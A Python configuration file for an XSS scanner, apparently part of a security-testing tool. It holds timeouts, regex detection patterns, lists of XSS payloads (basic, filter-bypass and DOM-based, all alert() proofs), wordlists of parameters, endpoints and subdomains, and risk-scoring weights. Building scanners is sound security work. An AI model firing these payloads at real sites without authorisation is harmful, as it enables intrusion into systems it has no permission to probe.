#!/usr/bin/env python3
"""
Configuration file for XSS Scanner
"""

# Scanner Configuration
SCANNER_CONFIG = {
    'default_timeout': 10,
    'default_threads': 5,
    'default_depth': 2,
    'max_urls_per_domain': 1000,
    'delay_between_requests': 0.1,
    'max_payload_length': 500,
    'default_user_agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    )
}

# XSS Detection Patterns
XSS_DETECTION_PATTERNS = {
    'script_execution': [
        r'<script[^>]*>.*?</script>',
        r'javascript:',
        r'on\w+\s*=',
        r'eval\s*\(',
        r'alert\s*\(',
        r'confirm\s*\(',
        r'prompt\s*\('
    ],
    'html_injection': [
        r'<[^>]*>',
        r'&lt;[^&]*&gt;',
        r'&#\d+;',
        r'&\w+;'
    ],
    'url_injection': [
        r'javascript:',
        r'data:',
        r'vbscript:',
        r'mhtml:'
    ]
}

# Common XSS Payloads by Category
PAYLOAD_CATEGORIES = {
    'basic': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>"
    ],
    'advanced': [
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(/XSS/)</script>",
        "'\"><script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=\"x\" onerror=\"alert('XSS')\">",
        "<svg><script>alert('XSS')</script></svg>",
        "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">"
    ],
    'bypass': [
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&#60;script&#62;alert('XSS')&#60;/script&#62;",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "<script>alert('\\x58\\x53\\x53')</script>",
        "<script>Function('alert(\"XSS\")')();</script>",
        "<script>setTimeout('alert(\"XSS\")',1)</script>"
    ],
    'dom_based': [
        "#<script>alert('DOM-XSS')</script>",
        "#<img src=x onerror=alert('DOM-XSS')>",
        "#javascript:alert('DOM-XSS')",
        "#';alert(document.domain);//",
        "#\";alert(document.domain);//"
    ]
}

# Common vulnerable parameters
VULNERABLE_PARAMETERS = [
    'q', 'query', 'search', 'keyword', 'term',
    'id', 'user', 'username', 'name', 'email',
    'message', 'comment', 'text', 'content', 'data',
    'url', 'link', 'redirect', 'return', 'callback',
    'page', 'p', 'view', 'action', 'cmd', 'command',
    'file', 'path', 'dir', 'folder', 'category',
    'type', 'sort', 'order', 'filter', 'value'
]

# Common endpoints to test
COMMON_ENDPOINTS = [
    '/search', '/login', '/register', '/contact',
    '/comment', '/post', '/submit', '/upload',
    '/admin', '/user', '/profile', '/account',
    '/api', '/rest', '/graphql', '/json',
    '/test', '/debug', '/dev', '/demo'
]

# Subdomain wordlist
SUBDOMAIN_WORDLIST = [
    'www', 'mail', 'ftp', 'admin', 'test', 'dev',
    'staging', 'api', 'app', 'blog', 'shop', 'store',
    'support', 'help', 'docs', 'cdn', 'assets',
    'static', 'media', 'images', 'secure', 'login',
    'auth', 'mobile', 'm', 'beta', 'alpha'
]

# File extensions to test
TEST_EXTENSIONS = [
    '.php', '.asp', '.aspx', '.jsp', '.cgi',
    '.html', '.htm', '.xml', '.json', '.txt'
]

# Headers for different types of requests
REQUEST_HEADERS = {
    'standard': {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    },
    'ajax': {
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    },
    'api': {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }
}

# Output formats configuration
OUTPUT_FORMATS = {
    'json': {
        'extension': '.json',
        'content_type': 'application/json'
    },
    'html': {
        'extension': '.html',
        'content_type': 'text/html'
    },
    'csv': {
        'extension': '.csv',
        'content_type': 'text/csv'
    },
    'xml': {
        'extension': '.xml',
        'content_type': 'application/xml'
    },
    'txt': {
        'extension': '.txt',
        'content_type': 'text/plain'
    }
}

# Selenium configuration
SELENIUM_CONFIG = {
    'page_load_timeout': 30,
    'implicit_wait': 10,
    'window_size': (1920, 1080),
    'chrome_options': [
        '--headless',
        '--no-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-logging',
        '--log-level=3',
        '--disable-web-security',
        '--allow-running-insecure-content'
    ]
}

# Risk scoring configuration
RISK_SCORING = {
    'vulnerability_weights': {
        'Stored XSS': 30,
        'Reflected XSS': 20,
        'DOM-based XSS': 20
    },
    'context_multipliers': {
        'admin_panel': 2.0,
        'user_input': 1.5,
        'api_endpoint': 1.3,
        'public_page': 1.0
    },
    'severity_thresholds': {
        'critical': 80,
        'high': 60,
        'medium': 40,
        'low': 20
    }
}
